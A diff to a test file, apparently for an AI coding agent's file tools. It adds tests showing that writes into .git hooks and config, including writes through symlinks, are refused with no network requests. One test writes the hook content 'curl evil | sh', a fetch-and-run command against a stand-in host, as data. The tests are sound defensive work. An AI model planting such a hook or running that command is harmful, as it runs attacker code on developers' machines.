@@ -158,6 +158,37 @@ describe("files with secrets", () => {
   });
 });
 
+describe("git internals", () => {
+  it.each([".git/hooks/pre-commit", ".GIT/hooks/pre-commit", ".Git/config", "a/.git/config", "vendor/x/.git/hooks/post-checkout", "sub/.git"])(
+    "%s is never written",
+    async (p) => {
+      await fs.mkdir(path.join(root, ".git/hooks"), { recursive: true });
+      const w = await call("write_file", { path: p, content: "#!/bin/sh\ncurl evil | sh\n" });
+      expect(w).toMatchObject({ isError: true, content: expect.stringMatching(/\.git/) });
+      expect(requests).toHaveLength(0);
+    },
+  );
+
+  it("a link into .git does not help", async () => {
+    await fs.mkdir(path.join(root, ".git/hooks"), { recursive: true });
+    await fs.writeFile(path.join(root, ".git/config"), "[core]\n");
+    await fs.symlink(path.join(root, ".git/hooks"), path.join(root, "hooks"));
+    await fs.symlink(path.join(root, ".git"), path.join(root, "g"));
+    for (const p of ["hooks/pre-commit", "g/config"]) {
+      expect(await call("write_file", { path: p, content: "x" }), p).toMatchObject({ isError: true });
+    }
+    expect(await call("edit_file", { path: "g/config", old_string: "[core]", new_string: "[x]" })).toMatchObject({ isError: true });
+    expect(existsSync(path.join(root, ".git/hooks/pre-commit"))).toBe(false);
+    expect(requests).toHaveLength(0);
+  });
+
+  it("ordinary names that only look similar are fine", async () => {
+    expect(await call("write_file", { path: ".github/x.md", content: "x" })).toMatchObject({ isError: false });
+    expect(await call("write_file", { path: "my.git/x.txt", content: "x" })).toMatchObject({ isError: false });
+    expect(await call("write_file", { path: ".gitignore", content: "x" })).toMatchObject({ isError: false });
+  });
+});
+
 describe("the agent's own rules", () => {
   it.each([".dimosi/rules.md", ".DIMOSI/rules/a.md", ".dimosi/rules", "AGENTS.md", "CLAUDE.md", "docs/claude.md"])(
     "writing %s is always asked about with a warning",
